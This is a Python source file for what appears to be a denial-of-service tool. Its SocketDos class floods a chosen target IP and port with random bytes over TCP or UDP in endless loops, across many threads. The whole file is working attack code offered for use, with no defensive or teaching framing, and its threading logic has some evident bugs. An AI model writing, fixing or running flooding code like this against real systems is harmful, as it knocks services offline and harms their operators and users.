import socket
import random
import sys
import itertools
from threading import Thread
from src.utils import color_text
from src.config import TCP, UDP, DEFAULT_NUM_THREADS


class SocketDos():

    def __init__(self, args):
        self.target_ip = args.target
        self.target_port = args.port
        self.protocol = self.get_socket_type(args.attack)
        self.tcp_size_bytes = getattr(args, 'tcp_size_bytes', 1024)
        self.udp_size_bytes = getattr(args, 'udp_size_bytes', 1024)
        self.threads = args.threads if args.threads is not None else DEFAULT_NUM_THREADS
        self.monothread = args.monothread if args.monothread is not None else False
        self.counter = itertools.count(1)

    def get_socket_type(self, protocol):
        if protocol == 'tcp':
            return TCP
        elif protocol == 'udp':
            return UDP
        else:
            raise ValueError(f"Unsupported protocol: {protocol}")

    def tcp_flood(self):
        try:
            while True:
                sock = socket.socket(socket.AF_INET, TCP)
                sock.connect((self.target_ip, self.target_port))
                bytes_to_send = random._urandom(self.tcp_size_bytes)
                sock.sendall(bytes_to_send)
                self.count_requests()
        except Exception as e:
            color_text('red', f'[!] Error in tcp_flood: {e}')

    def udp_flood(self):
        """ 
        UDP flood, send 1024 bytes
        """
        sock = socket.socket(socket.AF_INET, UDP)
        bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
        while True:
            sock.sendto(bytes_to_send, (self.target_ip, self.target_port))

    def count_requests(self):

        request_nb = next(self.counter)

        if request_nb % 10_000 == 0:
            sys.stdout.write(f'{request_nb} request send !\r\n')
            sys.stdout.flush()

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        try:
            if not self.protocol or self.protocol not in (TCP, UDP):
                raise ValueError(f"Unsupported protocol: {self.protocol}")
            
            if self.monothread:
                if self.protocol == TCP:
                    return self.tcp_flood
                elif self.protocol == UDP:
                    return self.udp_flood
                
            else:
                for _ in range(self.threads):
                    if self.protocol == UDP:
                        thread = Thread(target=self.udp_flood)
                        
                    if self.protocol == TCP:
                        thread = Thread(target=self.tcp_flood)
                        thread.start()

        except Exception as e:
            color_text('red', f'[!] Error: {e}')
